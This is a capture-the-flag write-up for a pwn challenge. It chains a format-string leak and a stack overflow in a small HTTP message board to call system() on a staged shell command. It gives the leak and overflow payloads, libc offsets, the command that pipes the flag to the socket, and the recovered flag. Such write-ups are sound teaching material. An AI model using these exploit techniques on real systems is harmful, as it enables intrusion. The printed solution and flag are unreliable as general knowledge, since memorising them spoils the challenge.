# Creaning Writeup

## Challenge Info

- **Name**: `creaning`
- **Category**: `pwn`
- **Remote**: `nc careening.ctf.ritsec.club 1501`

## Files

- `secureboard`
- `libc.so.6`
- `Dockerfile`

## Summary

The service is a tiny HTTP message board implemented as a stripped Rust PIE binary. It exposes `GET /msg/<idx>` and `POST /msg/<idx>`, stores messages in a shared arena, and has two distinct bugs inside the request handler:

1. A format-string bug in the `X-Debug` path because `User-Agent` is passed directly as the format string to `snprintf`.
2. A stack overflow in the POST-body handling because the request body is copied into a `0x200` stack buffer with attacker-controlled `Content-Length`.

Those two bugs compose perfectly:

1. Use the format string to leak `atoll@libc`, a PIE return address, and the arena base.
2. Store a shell command in a message slot inside the arena.
3. Use the overflow to overwrite the handler's local function pointer with `system` and its local arena pointer with the address of the staged command.
4. When the handler performs its normal callback, it actually runs `system(command)`.
5. Redirect the command output back to the connected client socket and recover the flag.

## Protections

`checksec --file=secureboard`

```text
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
```

Important observations:

- Full RELRO blocks simple GOT overwrites.
- NX blocks shellcode.
- PIE and ASLR mean we need leaks.
- No canary means a stack overwrite is still very useful.

## Reversing Notes

### Network shape

The binary listens on `0.0.0.0:8080` and speaks very small HTTP-like responses. Useful strings:

- `/msg/`
- `HTTP/1.1 200 OK`
- `User-Agent`
- `Content-Length`
- `X-Debug`
- `X-Debug-Info: %s`

Dynamic behavior confirmed:

- `GET /msg/0` returns `(no message)` initially.
- `POST /msg/0` with body `hello` returns `[MSG#0] hello`.

### The request handler

The main handler lives around `0x59d50`. The relevant logic is:

1. Read up to `0xfff` bytes from the socket into a stack buffer.
2. Parse the request line and `/msg/<idx>`.
3. Parse headers:
   - `Content-Length`
   - `User-Agent`
   - `X-Debug`
4. If a body exists, copy it into the local `User-Agent` buffer.
5. For `POST`, store the first `min(Content-Length, 0x50)` bytes into the arena.
6. Call a function pointer stored on the stack to fetch the message for the HTTP response body.

Relevant disassembly:

```asm
59d69: lea    rdi,[rsp+0x20]
59d70: mov    edx,0x210
59d77: call   memset
59d7c: mov    QWORD PTR [rsp+0x230],r15   ; local callback pointer
59d84: mov    QWORD PTR [rsp+0x238],r14   ; local arena pointer
...
59f6e: mov    edx,0x1ff
59f73: lea    rdi,[rsp+0x20]              ; User-Agent buffer
59f78: mov    rsi,r12
59f7b: call   strncpy
...
5a01c: lea    rdi,[rsp+0x20]
5a021: mov    rsi,r12                     ; request body
5a024: call   memcpy                      ; body -> User-Agent buffer
...
5a061: call   QWORD PTR [rsp+0x230]       ; callback(arena_ptr, msg_idx)
```

That `memcpy` is the overflow primitive. The local layout from the start of the `User-Agent` buffer is:

- `+0x000` user-agent/body buffer (`0x200` bytes)
- `+0x200` parsed `Content-Length`
- `+0x208` request method flag
- `+0x210` callback pointer
- `+0x218` arena pointer

So a body longer than `0x210` can rewrite both the callback and its first argument.

### Format-string bug

If the request contains `X-Debug: 1`, the handler builds a debug header using:

```asm
59fe8: lea    rdi,[rsp+0x240]
59fef: lea    rdx,[rsp+0x20]              ; format string = User-Agent
59ffc: call   snprintf
```

That means `User-Agent` is not treated as plain data. It is treated as the `snprintf` format string.

Using:

```text
User-Agent: %1$p|%2$p|%3$p
X-Debug: 1
```

the service leaks:

- `%1$p` -> `atoll@GOT`, which resolves to `atoll@libc`
- `%2$p` -> a return address inside the PIE
- `%3$p` -> the arena base

The exact offsets used by the solve:

- `atoll` offset in supplied libc: `0x46690`
- `system` offset in supplied libc: `0x58750`
- PIE leak adjustment: `0x5874f`

So:

```python
libc_base = atoll_leak - 0x46690
system    = libc_base + 0x58750
pie_base  = pie_leak - 0x5874f
```

## Arena Layout

The message-store function at `0x15f90` shows each slot is `0x80` bytes wide and message bytes begin `0x60` bytes into the slot:

```asm
15f97: shl    rbx,0x7              ; idx * 0x80
15fcf: lea    rdi,[r14+rbx+0x60]   ; destination for message bytes
16011: mov    QWORD PTR [r14+rbx+0x40],r15
```

The useful command pointer for slot `n` is therefore:

```text
arena_base + n*0x80 + 0x60
```

## Exploit Plan

### Stage 1: Leak addresses

Send:

```http
GET /msg/0 HTTP/1.1
Host: pwn
X-Debug: 1
User-Agent: %1$p|%2$p|%3$p

```

This yields:

- libc base
- PIE base
- arena base

### Stage 2: Stage a command in the arena

Use normal `POST /msg/<idx>` requests to store shell commands such as:

```sh
sh -c 'cat /flag.txt >&4'
```

I staged multiple variants for file descriptors `4..8`, but on the remote service `4` was correct.

### Stage 3: Overflow the handler frame

Build a POST body that preserves the important locals and overwrites the dispatch pair:

```python
payload  = b"A" * 0x200
payload += p64(0x50)         # keep parsed Content-Length sane
payload += p32(1) + p32(0)   # preserve POST method flag
payload += p64(system)       # overwrite callback pointer
payload += p64(cmd_ptr)      # overwrite arena pointer -> command string
```

When the handler reaches:

```c
callback(arena_ptr, msg_idx);
```

it effectively becomes:

```c
system(command_ptr);
```

and the command writes the flag directly back to the socket.

## Solver

The included solver is [`solution.py`](./solution.py).

Usage:

```bash
python3 solution.py
```

Optional local test:

```bash
python3 solution.py HOST=127.0.0.1 PORT=18080 TARGET_FILE=/etc/hostname
```

## Remote Result

Recovered flag:

```text
RS{CFI_b1ind_sp0t_g0t_us3d_4g41n5t_b04rd_53cur1ty}
```

## Why This Works

This challenge combines two individually strong primitives in the same request handler:

- A format string to defeat PIE and libc ASLR.
- A stack overwrite to redirect an indirect call.

The interesting twist is that the binary already stores a callback pointer on the stack and later calls it in a normal code path. That makes code execution much simpler than building a full ROP chain:

- no return-address corruption needed
- no canary to bypass
- no GOT overwrite needed despite full RELRO
- only one libc symbol leak was enough

The title/description hint about an “unbreakable” message board fits the bug chain well: the board’s own message storage becomes a staging area for the shell command that gets executed.
